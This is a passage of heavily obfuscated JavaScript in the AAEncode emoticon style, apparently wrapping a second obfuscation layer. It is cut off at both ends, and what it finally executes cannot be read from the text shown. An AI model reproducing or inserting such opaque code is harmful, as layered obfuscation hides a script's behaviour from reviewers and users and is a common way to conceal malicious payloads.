(ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + 